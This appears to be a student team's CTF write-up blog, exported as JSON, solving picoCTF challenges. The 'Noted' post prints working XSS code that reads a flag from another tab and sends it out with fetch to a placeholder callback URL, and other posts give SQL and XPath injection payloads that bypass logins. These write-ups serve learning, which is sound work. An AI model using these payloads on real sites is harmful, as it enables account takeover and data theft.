[{"content":"Challenge Rating  Artificialness: 3/10 Skill: 8/10 Time: 2-3 days  Learn more about how we rate challenges here.\nPreface This write-up assumes you have a moderate to advanced understanding of SOP (Same-Origin Policy) and CORS (Cross-Origin Resource Sharing). If you don\u0026rsquo;t, you should check out MDN\u0026rsquo;s SOP and CORS articles. One other thing you should note (Pun intended) is that, despite what the challenge description says, the headless browser DOES have internet access. However, the exploit featured in this write-up does work without internet access.\nSolving the challenge Exploring the website The first thing I like to do with this sort of challenge is play around with the functioning website. This not only makes me to familiar with the features of the website, but also the overall architecture.\nIn this challenge, perhaps quite predictably, the website is a note-taking app There\u0026rsquo;s a primitive account system with a registration and login page. There\u0026rsquo;s also, of course, a page for creating and viewing/deleting notes. But there\u0026rsquo;s one other feature: a Report button. If you\u0026rsquo;ve played a lot of web CTFs, you\u0026rsquo;re probably quite familiar with report buttons in challenges. Typically, they send a URL to a headless browser which navigates to it and this challenge is no different. But oftentimes, the scheme or domain is restricted, but maybe not for this challenge? We can check by looking at the source code.\nExploring the code Note: in order to get access to the source code, you can download it from here or click the Launch Instance button in picoGym and you should see a download link.\nThankfully, the code base isn\u0026rsquo;t too large and I was able to skim over everything fairly quickly. This confirmed that there were no restrictions on the report URL. Maybe we can use javascript URL\u0026rsquo;s? I also noticed that the headless browser navigates to the account creation page, creates an account with a completely random username and password, then creates a note with the flag in it. Then, it navigates to about:blank and finally the URL we control. If you\u0026rsquo;re curious as to why it navigates to about:blank, this prevents us from sending the below JavaScript (Via a javascript URL):\n//Get the flag const flag = document.querySelector(\u0026#39;p\u0026#39;).innerText; //Exfiltrate fetch(\u0026#39;[Callback URL here; check out https://hookbin.com]\u0026#39;, { method: \u0026#39;POST\u0026#39;, mode: \u0026#39;no-cors\u0026#39;, body: flag }); That would\u0026rsquo;ve made this challenge considerably easier, but it seems EHHTHING (The challenge author) already thought of that. Shucks! However, I noticed that the notes page is vulnerable to self-XSS (Since there\u0026rsquo;s absolutely zero sanitization). But alas, I was a bit stuck. I started to examine the hints a little more closely. For reference, they are:\n Are you sure I followed all the best practices? There\u0026rsquo;s more than just HTTP(S)! Things that require user interaction normally in Chrome might not require it in Headless Chrome.  It\u0026rsquo;s safe to say that hint #1 is related to not sanitizing user input and #2 is related to javascript URL\u0026rsquo;s. But I was confused about #3. I thought that I may need to navigate backwards, grab the flag, and exfiltrate. Surely that\u0026rsquo;s not too hard, right? Well several days went by until I finally gave up on this idea. It\u0026rsquo;s not that it was difficult to navigate backwards (The history API can do that), it\u0026rsquo;s just that you can\u0026rsquo;t execute code once the browser navigates backwards, otherwise it would totally bypass the same-origin policy.\nDialogs I was starting to think that there might be some dialog the shows up in headful browsers, but to prevent interference, the headless browser auto-closes or auto-accepts something. If the headless browser allowed me to say, take a screenshot or print a tab without user-interaction, I could open a tab with the flag on it, take a screenshot or print it, and then upload the image buffer. This rabbit hole lead me to search through the entire Chromium repository for any behavior the --headless flag modifies (I knew it was Chrome since it\u0026rsquo;s installed in the Dockerfile). Unfortunately for me, only very minor behavior related to PDF printing changes with the --headless flag.\nBy now, I was very puzzled by hint #3 - to be honest, at the time of writing this, I still don\u0026rsquo;t entirely know what it was referring to. But I also knew there must be a way, so I persevered.\nResearch \u0026amp; development I figured that the best way to proceed was to take a step back, read some write-ups from other CTFs, and just let the creative juices flow. I kept finding write-ups like this one that demonstrated how you can use iFrames to bypass the same-origin policy. It looked fairly relevant, so I tried it out. However, this exploit requires the server to set the SameSite=none (Now that cookies in Chrome default to Lax). I kept reading, and eventually stumbled across this write-up (Which I urge you to read after this). It demonstrated a very similar approach, except instead of using iFrames, it used separate tabs. After reading it, I immediately began formulating a plan of attack:\n Use the self-XSS vulnerability to create a malicious note Send a javascript URL to the headless browser (Tab 1), which will:  Open the page with the flag on it (Tab 2) Log in to an account we control (Tab 3)   The malicious note (on tab 3) will then:  Get a reference to tab 2 (with the flag) Extract the flag from tab 2 Exfiltrate the flag    Because both the tab with the flag and the tab with the malicious note are from the same origin, we completely bypass the same-origin policy.\nSolving the remaining problems Unfortunately, there are a few problems to this approach:\n How can we make the headless browser sign into an account we control (Since CORS prevents us from making the login request from a null origin and opaque requests won\u0026rsquo;t save the response)? How to get a reference to an already-open tab?  Thankfully, both of these are relatively easy to solve. I had actually pre-emptively solved the first problem, figuring I would need it to trigger the self-XSS. But to give credit where it\u0026rsquo;s due, the aforementioned writeup helped me solve the second problem.\nThe first problem can be solved by looking at the website\u0026rsquo;s front-end, specifically the login view. Instead of using fetch or XMLHttpRequest, we can create a form with the action attribute set to the full login URL. We can programmatically create and submit the form using:\n//Settings const username = \u0026#39;aaaa\u0026#39;; const password = \u0026#39;bbbb\u0026#39;; //Create the form const form = document.createElement(\u0026#39;form\u0026#39;); form.action = \u0026#39;http://0.0.0.0:8080/login\u0026#39;; form.method = \u0026#39;POST\u0026#39;; form.target = \u0026#39;_blank\u0026#39;; const usernameInput = document.createElement(\u0026#39;input\u0026#39;); usernameInput.type = \u0026#39;text\u0026#39;; usernameInput.name = \u0026#39;username\u0026#39;; usernameInput.value = username; form.appendChild(usernameInput); const passwordInput = document.createElement(\u0026#39;input\u0026#39;); passwordInput.type = \u0026#39;password\u0026#39;; passwordInput.name = \u0026#39;password\u0026#39;; passwordInput.value = password; form.appendChild(passwordInput); const submit = document.createElement(\u0026#39;input\u0026#39;); submit.type = \u0026#39;submit\u0026#39;; form.appendChild(submit); //Add to the document document.body.appendChild(form); //Submit submit.click(); The second problem can be solved by examining window.open. You see, if you open anything with the target parameter set to a specific value, you can obtain a reference to that same tab/window by \u0026ldquo;opening\u0026rdquo; the same tab/window again, except with an empty url. For example:\n//Open a new tab/window, without saving the reference window.open(\u0026#39;https://example.com\u0026#39;, \u0026#39;someExampleWebsite\u0026#39;); //Get the reference to the existing tab/window const reference = window.open(\u0026#39;\u0026#39;, \u0026#39;someExampleWebsite\u0026#39;); Final Exploit Now it was time to piece it all together. To run the exploit yourself, create a note with the content:\n\u0026lt;script\u0026gt; //Only run in the headless browser  if (window.location.hostname == \u0026#39;0.0.0.0\u0026#39;) { //Get a reference to the flag window  const flagWindow = window.open(\u0026#39;\u0026#39;, \u0026#39;flagWindow\u0026#39;); //Get the flag  const flag = flagWindow.document.querySelector(\u0026#39;p\u0026#39;).innerText; //Exfiltrate  fetch(\u0026#39;[Callback URL here; check out https://hookbin.com]\u0026#39;, { method: \u0026#39;POST\u0026#39;, mode: \u0026#39;no-cors\u0026#39;, body: flag }); } \u0026lt;/script\u0026gt; However, if you want to stay true to the challenge and avoid using the internet, create a note with the below content. I\u0026rsquo;ve omitted some comments to keep the note content under the 1000 character limit.\n\u0026lt;script\u0026gt; //Settings  const username = \u0026#39;aaaa\u0026#39;; const password = \u0026#39;bbbb\u0026#39;; const main = async () =\u0026gt; { if (window.location.hostname == \u0026#39;0.0.0.0\u0026#39;) { const flagWindow = window.open(\u0026#39;\u0026#39;, \u0026#39;flagWindow\u0026#39;); const flag = flagWindow.document.querySelector(\u0026#39;p\u0026#39;).innerText; //Login to the account we control  await fetch(\u0026#39;/login\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: new URLSearchParams({ username, password }) }); //Get the CSRF token  const res = await fetch(\u0026#39;/new\u0026#39;); const token = new DOMParser() .parseFromString(await res.text(), \u0026#39;text/html\u0026#39;) .querySelector(\u0026#39;input[name=\u0026#34;_csrf\u0026#34;][type=\u0026#34;hidden\u0026#34;]\u0026#39;).value; //Exfiltrate  await fetch(\u0026#39;/new\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: new URLSearchParams({ title: \u0026#39;Flag\u0026#39;, content: flag, \u0026#39;_csrf\u0026#39;: token }) }); } }; main(); \u0026lt;/script\u0026gt; Note: some concessions were made to keep the note length under 1000 characters.\nThen update the settings of the below code (especially the credentials), uglify it using UglifyJS or something similar, prepend javascript: to it, report the URL, wait ~20 seconds, and check the callback URL or the notes page (depending on the exfiltration method).\n//Settings const username = \u0026#39;aaaa\u0026#39;; const password = \u0026#39;bbbb\u0026#39;; //Open the flag window window.open(\u0026#39;http://0.0.0.0:8080\u0026#39;, \u0026#39;flagWindow\u0026#39;); //Create the form const form = document.createElement(\u0026#39;form\u0026#39;); form.action = \u0026#39;http://0.0.0.0:8080/login\u0026#39;; form.method = \u0026#39;POST\u0026#39;; form.target = \u0026#39;_blank\u0026#39;; const usernameInput = document.createElement(\u0026#39;input\u0026#39;); usernameInput.type = \u0026#39;text\u0026#39;; usernameInput.name = \u0026#39;username\u0026#39;; usernameInput.value = username; form.appendChild(usernameInput); const passwordInput = document.createElement(\u0026#39;input\u0026#39;); passwordInput.type = \u0026#39;password\u0026#39;; passwordInput.name = \u0026#39;password\u0026#39;; passwordInput.value = password; form.appendChild(passwordInput); const submit = document.createElement(\u0026#39;input\u0026#39;); submit.type = \u0026#39;submit\u0026#39;; form.appendChild(submit); //Add to the document document.body.appendChild(form); //Submit submit.click(); ","date":"2022-04-02T22:22:10-06:00","permalink":"https://bmhs-tsa.github.io/post/noted/","title":"Noted"},{"content":"Challenge Rating  Artificialness: 5/10 Skill: 3/10 Time: 5-10 minutes  Learn more about how we rate challenges here.\nThe CTF starts out by giving you a python file called crackme.py. When you run it, it just takes two numbers as input and outputs the largest. Not very helpful for finding flags, unless\u0026hellip;\nHow do we find the flag? When you open the file in any text editor, you\u0026rsquo;ll see that there\u0026rsquo;s more to this program than it seems. There\u0026rsquo;s a variable called bezos_cc_secret that seemingly has gibberish in it. But there\u0026rsquo;s another function, never used in the entire program, called decode_secret which (you guessed it) decodes bezos_cc_secret. Just call the function at the end of the program and run it again and you will have your flag.\n","date":"2021-04-09T16:06:11-06:00","permalink":"https://bmhs-tsa.github.io/post/crackme-py/","title":"crackme-py"},{"content":"Challenge Rating  Artificialness: 7/10 Skill: 5/10 Time: 3 hours  Learn more about how we rate challenges here.\nThis is another Wireshark challenge, expanding on the first challenge. Wireshark is a piece of software used to monitor network traffic.\nInitial analysis Starting off I (loogalicious) opened the file in Wireshark. After browsing through it, I noticed 90 or so flags in the responses from http://18.217.1.57/flag and the AWS EC2 token in packet 4344 caught my eye: After Wakeful-Cloud and I made a script to extract all of the flags, I realized they were red herrings. Then I found the DNS queries to *.reddshrimpandherring.com and looked through the given website but found nothing. This is the point when Wakeful-Cloud switched from helping me to actually working to solve the challenge.\nDNS queries The first thing I (Wakeful-Cloud) did towards solving this challenge was to sort by packet protocol and just familiarize myself with the capture. This also helps to weed out any noise that may have been generated (Since the noise is often generated from a different application/protocol). There were a few odd things that I noticed such as an enormous amount of invalid DNS queries to *.reddshrimpandherring.com: What really bothered me is why there were so many invalid queries. I\u0026rsquo;d expect that software designed to make lots of DNS queries would have some kind of back-off algorithm but whatever was making these requests clearly did not. The next thing I did was sort by time and just scroll through all the packets. Eventually, I noticed packet 3969: If you\u0026rsquo;re a web developer, you may recognize the 2 trailing equal-signs as the padding used by base 64. At this point, it seemed quite obvious to me that in order to solve the challenge, I\u0026rsquo;d have to combine all the invalid DNS queries together and decode it. In order to extract all the queries, I used T-Shark and the filter dns.qry.name matches \u0026quot;.*\\.reddshrimpandherring\\.com$\u0026quot; \u0026amp;\u0026amp; ip.src == 18.217.1.57 (You can use this filter in the GUI too). The command to dump all the DNS queries I used is:\n# Bash tshark -r ./shark2.pcapng -Y \u0026#39;dns.qry.name matches \u0026#34;.*\\.reddshrimpandherring\\.com$\u0026#34; \u0026amp;\u0026amp; ip.src == 18.217.1.57\u0026#39; -T fields -e dns.qry.name | uniq \u0026gt; dns.txt # Powershell tshark -r ./shark2.pcapng -Y \u0026#39;dns.qry.name matches \u0026#34;.*\\.reddshrimpandherring\\.com$\u0026#34; \u0026amp;\u0026amp; ip.src == 18.217.1.57\u0026#39; -T fields -e dns.qry.name | Get-Unique \u0026gt; dns.txt Processing the queries Now that we have a file (dns.txt) filled with unique DNS requests, we need to combine the subdomains and parse the base 64. To do this, I used the below JS script:\n//Imports const {readFileSync, writeFileSync} = require(\u0026#39;fs\u0026#39;); //Read the file const raw = readFileSync(\u0026#39;./dns.txt\u0026#39;, \u0026#39;utf-8\u0026#39;); //Split each line const lines = raw.split(\u0026#39;\\n\u0026#39;).filter(line =\u0026gt; line != \u0026#39;\u0026#39;); //Combine let base64 = \u0026#39;\u0026#39;; for (const line of lines) { //Extract the subdomain  const subdomain = /([^.]+)/.exec(line); //Append the subdomain  if (subdomain != null) { base64 += subdomain[0]; } } //Interpret the base 64 const data = Buffer.from(base64, \u0026#39;base64\u0026#39;); //Log console.log(data.toString()); Note: this script assumes your file uses Linux-style new-lines. If you\u0026rsquo;re not, be sure to update line 8 from '\\n' to whatever new-line-characters you\u0026rsquo;re using.\nIf you run this, it should write the flag to the console.\n","date":"2021-04-09T15:58:15-06:00","permalink":"https://bmhs-tsa.github.io/post/wireshark-2/","title":"Wireshark 2"},{"content":"Challenge Rating  Artificialness: 7/10 Skill: 4/10 Time: 15-30 minutes  Learn more about how we rate challenges here.\nThis challenge is a Wireshark-based challenge, which involves analyzing network traffic through Wireshark.\nWhat software do you need? Wireshark and a ROT13 decoder, which you can find online.\nWhat do you need to know in order to solve it? You need to know how to export Wireshark objects into HTTP and possibly how to recognize ROT13 encryptions if you don\u0026rsquo;t want to spend 20 minutes looking up different decryption websites.\nWhat do you actually do? Open the file in Wireshark, first of all. Then Export Objects into HTTP and click Save All. It\u0026rsquo;ll put all of the HTTP requests into the destination of your choice, mine was Downloads, and then open the %5c (which is a percent-encoded character) folder in a text editor of your choice. The text is encoded in ROT13 which I encoded after trying several other algorithms. The encrypted text contains the flag.\n","date":"2021-04-09T15:48:38-06:00","permalink":"https://bmhs-tsa.github.io/post/wireshark-doo-dooo-do-doo/","title":"Wireshark Doo Dooo Do Doo"},{"content":"Challenge Rating  Artificialness: 3/10 Skill: 7/10 Time: 4-6 hours  Learn more about how we rate challenges here.\nPreface This write-up assumes you understand what an injection vulnerability is. If you don\u0026rsquo;t you, should check out Web Gauntlet 2.\nWhat is XPath? XPath is the standard way of querying data from an XML document (Similar to SQL). There are a few basic things you need to know about XPath:\n Think of XPath queries like a file-path (/ separated, items are written in a descending, hierarchical-order) A / represents the root element A // represents any element in any location You can extract an element\u0026rsquo;s content with {Element}/text() (eg: //user/name/text() equals guest) You can get a string\u0026rsquo;s length with string-length (eg: string-length('abc') equals 3) You can get a substring with substring (eg: substring('abc', 2, 1) equals b; note: XPath is one-indexed) You filter elements with [{Condition}]  You can filter by position with [position() {Operator} {Number}] (eg: [position() = 2]; note: XPath is one-indexed) You can filter by string-matches with ['A' = 'B'] You can join different conditions together with or or and    Solving the challenge Probable Query In order to develop an injection, it helps to have a query (Although it likely won\u0026rsquo;t be the same as the actual query picoCTF uses). To develop it, think about what conditions the server uses to find a user element: does the user\u0026rsquo;s name equal a user-controlled valued and does the user\u0026rsquo;s password equal another user-controlled value? The probable query I developed was:\n//user[name/text()=\u0026#39;[USERNAME INPUT]\u0026#39; and pass/text()=\u0026#39;[PASSWORD INPUT]\u0026#39;] Developing an injection Now that we have a probably query, we can start messing around with single-quote injection to try to escape the user-controlled strings. I found using abc as the username and ' or {CONDITION} and 'a'='a as the password allows for us to run arbitrary boolean expressions on the server (Note that You're on the right path. indicates true while Login failure. indicates false). While this doesn\u0026rsquo;t allow us to return strings, it\u0026rsquo;s a start.\nExfiltrating data We know we can evaluate a boolean expression but how can we extract a string? The answer is by testing each character in a string until we get the correct character and with enough characters, the entire string.\nInitially it may seem like this a place where binary search would work well - we could possibly check if the nth character code is greater than the a certain number however the fn:string-to-codepoints function is disabled. Therefore, we will have to go through each character sequentially (Linear search). This is the part where this challenge gets very painful. The good news is that we can reasonably assume all characters are inside of the printable ASCII range (97 characters) which is far easier to guess than say Unicode (143,859 characters).\nTo expedite this process, I developed a mini library for data extraction specifically for this challenge. You can view the source code here. This took a long time to extract because I followed multiple incorrect paths (Hence the flag\u0026rsquo;s message); but I did find this XML playground to be extremely helpful for constructing XPath queries. Eventually, I was able to extract the below XML document (And the flag too):\n\u0026lt;db\u0026gt; \u0026lt;poems\u0026gt; \u0026lt;poem\u0026gt; \u0026lt;author\u0026gt;Robert Frost\u0026lt;/author\u0026gt; \u0026lt;title\u0026gt;The Road Not Taken\u0026lt;/title\u0026gt; \u0026lt;text\u0026gt;[UNKNOWN]\u0026lt;/text\u0026gt; \u0026lt;/poem\u0026gt; \u0026lt;poem\u0026gt; \u0026lt;author\u0026gt;William Carlos Williams\u0026lt;/author\u0026gt; \u0026lt;title\u0026gt;The Red Wheelbarrow\u0026lt;/title\u0026gt; \u0026lt;text\u0026gt;[UNKNOWN]\u0026lt;/text\u0026gt; \u0026lt;/poem\u0026gt; \u0026lt;poem\u0026gt; \u0026lt;author\u0026gt;Pablo Neruda\u0026lt;/author\u0026gt; \u0026lt;title\u0026gt;Oda a la papa\u0026lt;/title\u0026gt; \u0026lt;text\u0026gt;[UNKNOWN]\u0026lt;/text\u0026gt; \u0026lt;/poem\u0026gt; \u0026lt;poem\u0026gt; \u0026lt;author\u0026gt;Gwendolyn Brooks\u0026lt;/author\u0026gt; \u0026lt;title\u0026gt;We Real Cool\u0026lt;/title\u0026gt; \u0026lt;text\u0026gt;[UNKNOWN]\u0026lt;/text\u0026gt; \u0026lt;/poem\u0026gt; \u0026lt;poem\u0026gt; \u0026lt;author\u0026gt;William Blake\u0026lt;/author\u0026gt; \u0026lt;title\u0026gt;The Tyger\u0026lt;/title\u0026gt; \u0026lt;text\u0026gt;[UNKNOWN]\u0026lt;/text\u0026gt; \u0026lt;/poem\u0026gt; \u0026lt;/poems\u0026gt; \u0026lt;users\u0026gt; \u0026lt;user\u0026gt; \u0026lt;name\u0026gt;guest\u0026lt;/name\u0026gt; \u0026lt;pass\u0026gt;thisisnottheflag\u0026lt;/pass\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;user\u0026gt; \u0026lt;name\u0026gt;bob\u0026lt;/name\u0026gt; \u0026lt;pass\u0026gt;thisisnottheflageither\u0026lt;/pass\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;user\u0026gt; \u0026lt;name\u0026gt;admin\u0026lt;/name\u0026gt; \u0026lt;pass\u0026gt;picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_f0505d9c}\u0026lt;/pass\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/users\u0026gt; \u0026lt;/db\u0026gt; Note: [UNKNOWN] represent strings that are very long and would take a long time to extract; you can probably make an educates guess though.\nData verification While extracting the data is very time-consuming and requires potentially thousands of HTTP requests, verifying the data is easy. For example, here\u0026rsquo;s the login credentials to verify the flag (Which could change if you\u0026rsquo;re reading this far in the future):\n Username: abc Password: ' or /db/users/user[position()=3]/pass/text() = 'picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_f0505d9c}' and 'a'='a  ","date":"2021-04-02T23:39:19-06:00","permalink":"https://bmhs-tsa.github.io/post/x-marks-the-spot/","title":"X Marks the Spot"},{"content":"Mod 26 This is a rot 13 cypher!\nWhat is ROT 13? ROT 13 is a cipher where every letter is rotated by 13 letters within the alphabet. It is a type of caesar cipher.\nHow can this be reversed? Rot 13 can be reversed the same way as it is encypted, by rotating the letters by thirteen charecters. In Python we can simply take the ASCII value of each letter (take out special charecters and numbers),and add thirteen, before using the modulo operator to loop backto the beginning of the alphabet.\nex = \u0026#39;cvpbPGSarkggvzrVyygelebhaqfbsebghyLicInt\u0026#39; letts = [] for i in range(len(ex)): letts.append(ex[i].lower()) letts[i] = (ord(letts[i]) - 97 + 13) % 26 letts[i] = chr(letts[i] + 97) print(letts) The output will look something like:\n[\u0026#39;p\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;g\u0026#39;] Manually add back special charecters and capitalization and you will have your flag.\nOnline Tools You can also use the following online tools to accomplish the same thing:\n dcode.fr/rot-13-cipher rot13.com cryptii.com/pipes/rot13-decoder  ","date":"2021-04-02T16:58:00-06:00","permalink":"https://bmhs-tsa.github.io/post/mod-13/","title":"Mod 13"},{"content":"Challenge Rating  Artificialness: 8/10 Skill: 2/10 Time: 3 minutes  Learn more about how we rate challenges here.\nWhat software do you need? Notepad or a text editor.\nWhat do you need to know in order to solve it? That nobody expects Notepad.\nWhat do you actually do? Open the file in Notepad and CTRL+F for picoCTF.\n","date":"2021-04-02T16:57:30-06:00","permalink":"https://bmhs-tsa.github.io/post/static-aint-always-noise/","title":"Static Aint Always Noise"},{"content":"Challenge Rating  Artificialness: 4/10 Skill: 3/10 Time: 5-10 minutes  Learn more about how we rate challenges here.\nWhat is SSH? SSH (Secure SHell) is a protocol for securely transmitting commands to a remote computer. It makes it possible to access files, run commands, and more, just from inside the terminal. More information can be found here.\nDoing the challenge Pico already gives you the command to use. When you first log in, the directory you\u0026rsquo;re in has 1of3.flag.txt and instructions-to-2of3.txt. Clearly, the flag is split up into three different files. Use the cat command to view these files and follow the instructions to get the rest of the flag. Combine each of the files in order (1of3.flag.txt, 2of3.flag.txt, and 3of3.flag.txt) to get the flag!\n","date":"2021-04-02T16:46:31-06:00","permalink":"https://bmhs-tsa.github.io/post/magikarp-ground-mission/","title":"Magikarp Ground Mission"},{"content":"Challenge Rating  Artificialness: 6/10 Skill: 4/10 Time: 10 minutes  Learn more about how we rate challenges here.\nWhat software do you need? Any type of zip extraction, 7zip or WinRAR work fine.\nWhat do you need to know in order to solve it? The aspect of this challenge is to find hidden files inside image files.\nWhat do you actually do? Archive the original file with (in my case) WinRAR, then extract it. In the extracted file, you\u0026rsquo;ll find another file and so on, so forth. Continue the archive-extract until you find a text file which contains the flag.\n","date":"2021-04-02T16:32:39-06:00","permalink":"https://bmhs-tsa.github.io/post/matryoshka-doll/","title":"Matryoshka Doll"},{"content":"Challenge Rating  Artificialness: 3/10 Skill: 6/10 Time: 30 minutes (Assuming you already solved Web Gauntlet 2)  Learn more about how we rate challenges here.\nPreface This is the followup challenge to Web Gauntlet 2 which itself is a followup to Web Gauntlet. This article assumes you\u0026rsquo;ve already solved Web Gauntlet 2.\nWhat\u0026rsquo;s different? Not a whole lot - just the maximum user input length. Our previous exploit (admi'||CHAR(1540/LENGTH( and ))||') is 29 characters long. We only need to shave off 4 characters to be within the 25 character limit, that shouldn\u0026rsquo;t be too hard.\nCondensing our payload The first thing I noticed is that the bridged string ( AND password=) contains 1 of the characters in admin: a. Since SQLite also has a SUBSTR function, we can use that bridged text meaning we can eliminate CHAR(1540/LENGTH()). This leaves us with:\nSELECTusername,passwordFROMusersWHEREusername=\u0026#39;\u0026#39;||substr(\u0026#39; AND password=\u0026#39;,7,1)||\u0026#39;dmin\u0026#39;;Now the total input is only 22 characters, 3 under the limit. Sweet! So if you set the username to '||substr( and the password to ,7,1)||'dmin, you should see the flag on filter.php.\n","date":"2021-03-31T00:32:29-06:00","permalink":"https://bmhs-tsa.github.io/post/web-gauntlet-3/","title":"Web Gauntlet 3"},{"content":"Challenge Rating  Artificialness: 3/10 Skill: 6/10 Time: 2-3 hours  Learn more about how we rate challenges here.\nPreface This is the followup challenge to Web Gauntlet.\nWhat are SQL injections? SQL injections occur when a server improperly handles user input in such a way that the user can write SQL queries and run them on the server. For example, lets say we\u0026rsquo;re running a simple web server that performs a username/password lookup:\nSELECTusername,passwordFROMusersWHEREusername=\u0026#39;[USERNAME INPUT]\u0026#39;ANDpassword=\u0026#39;[PASSWORD INPUT]\u0026#39;;Even if you don\u0026rsquo;t know SQL, you can probably figure out that we\u0026rsquo;re querying the database for users with a username equal to [USERNAME INPUT] and a password equal to [PASSWORD INPUT]. Well, say an attacker were to enter '. Just a single-quote. What do you think would happen? If the server was programmed correctly, it would escape the quote or filter it out resulting in the following query:\nSELECTusername,passwordFROMusersWHEREusername=\u0026#39;\u0026#39;\u0026#39;\u0026#39;ANDpassword=\u0026#39;[PASSWORD INPUT]\u0026#39;;Note: you escape single-quotes by doubling them up in SQLite.\nBut if the server simply concatenates or adds strings together to form a query such as with the below pseudocode:\n\u0026#34;SELECT username, password FROM users WHERE username=\u0026#39;\u0026#34; + username + \u0026#34;\u0026#39; AND password=\u0026#39;\u0026#34; + password + \u0026#34;\u0026#39;;\u0026#34; This would produce the following query:\nSELECTusername,passwordFROMusersWHEREusername=\u0026#39;\u0026#39;\u0026#39; AND password=\u0026#39;[PASSWORDINPUT]\u0026#39;; Note: this is actually an invalid query but bare with me.\nNotice how the syntax highlighting is different than when the server properly escapes the single-quote? That\u0026rsquo;s because we now have a single string starting with an escaped quote ('' AND password=). This is called an injection vulnerability because a crafty attacker could format the username or password in such a way that when the server concatenates the user-input together, it generates a totally different, malicious query.\nSolving the challenge One important thing to note about this challenge is that our user-input cannot contain any of the following or and true false union like = \u0026gt; \u0026lt; ; -- /* */ admin (Which can be found on the filter.php page).\nSetting the username So first we need to figure out how to query the admin user without actually typing admin (Because it\u0026rsquo;s filtered). Luckily, SQLite (The flavor of SQL this challenge uses) supports string concatenation (Adding two or more strings together). So now we can type admin with the following for the username: admi'||'n which will turn into:\nSELECTusername,passwordFROMusersWHEREusername=\u0026#39;admi\u0026#39;||\u0026#39;n\u0026#39;ANDpassword=\u0026#39;[PASSWORD INPUT]\u0026#39;;Sweet!\nSetting the password We don\u0026rsquo;t know the password and this challenge isn\u0026rsquo;t about getting the password, so we need to get more creative - think about ways of removing the AND part of the query.\nRemember how earlier when the attacker entered a single-quote (') it generated an invalid SQL query because the string kind of bridged the 2 user inputs? Well if we do something with that string, then that eliminates the password= part of the query meaning we don\u0026rsquo;t have to guess or crack the password.\nMy solution is far from elegant but I decided to kill 2 birds with one stone by using the length of the bridged string using the SQLite LENGTH function in combination with the SQLite CHAR function to generate the n in admin via character codes.\nIn essence, the bridged string is  AND password= (14 characters long) and the ASCII character code for n is 110. So then I multiplied 14 by 110 which is 1540. Finally I concatenated an empty string at the end to make sure there wasn\u0026rsquo;t an unmatched single-quote. When the server executes the query, it will undo the multiplication and return the correct character code. I know this sounds confusing but it\u0026rsquo;s somewhat simple when you see it written out:\nSELECTusername,passwordFROMusersWHEREusername=\u0026#39;admi\u0026#39;||CHAR(1540/LENGTH(\u0026#39; AND password=\u0026#39;))||\u0026#39;\u0026#39;;So if you set the username to admi'||CHAR(1540/LENGTH( and the password to ))||', you should see the flag on filter.php. Again, not the most elegant solution. If you want to see a more elegant solution, check out the sequel to this challenge, Web Gauntlet 3.\n","date":"2021-03-30T23:26:46-06:00","permalink":"https://bmhs-tsa.github.io/post/web-gauntlet-2/","title":"Web Gauntlet 2"},{"content":"Challenge Rating  Artificialness: 5/10 Skill: 3/10 Time: 5 minutes  Learn more about how we rate challenges here.\nWhat are HTTP verbs? Normally when you access a website, your browser makes an HTTP request to GET content from the server. However, your browser isn\u0026rsquo;t always fetching data from a server, sometimes it POSTs data too (Such as when logging in to a website). HTTP verbs are the standardized method for telling the server what to do. The most common HTTP verbs are:\n GET: fetch data from a server (eg: retrieve an HTML file) HEAD: check what the server will do before making a GET request (eg: check response size before fetching something) POST: post data to a server (eg: log in to a website) PUT: update an existing resource DELETE: delete a resource  Solving the challenge Although the Get in Get Ahead may throw you off, remember that web browsers make GET requests by default so this challenge may be a little too easy if all you had to do was just visit the link with a browser and open the inspector. Instead, focus on the Ahead part - as in a HEAD request. If you use a tool such as Postman, this is fairly easy to do: Please note that the flag is a header, not the response body.\n","date":"2021-03-30T22:38:13-06:00","permalink":"https://bmhs-tsa.github.io/post/get-ahead/","title":"Get Ahead"},{"content":"We rank CTF challenges on the following metrics:\n Artificialness Skill Time  Artificialness This metric measures how contrived or artificial a challenge is. This metric is measured on a scale from 1 to 10 where 1 represents a very realistic challenge while a 10 represents a very artificial challenge.\nSkill This metric measures how much skill a challenge requires to solve. If multiple ways of solving a challenge are available, this metrics should reflect the easiest one. This metric is also measured on a scale from 1 to 10 where 1 represents a challenge a complete novice could solve and a 10 represents a challenge only subject experts could solve.\nTime This metric measures how much time a challenge requires to solve on the first time without any outside help. This metric is measured in hours and minutes.\n","date":"2021-03-30T22:31:14-06:00","permalink":"https://bmhs-tsa.github.io/post/rating/","title":"Rating"}]